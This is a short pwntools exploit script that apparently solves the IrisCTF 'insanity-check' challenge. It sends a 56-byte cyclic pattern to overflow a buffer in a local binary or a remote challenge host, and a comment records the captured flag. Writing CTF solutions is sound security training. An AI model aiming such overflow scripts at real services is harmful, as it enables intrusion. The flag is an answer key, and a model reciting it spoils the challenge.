#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./vuln")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("insanity-check.chal.irisc.tf", 10003)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.sendline(cyclic(56))

	r.interactive()


if __name__ == "__main__":
	main()

# irisctf{c0nv3n13nt_symb0l_pl4cem3nt}
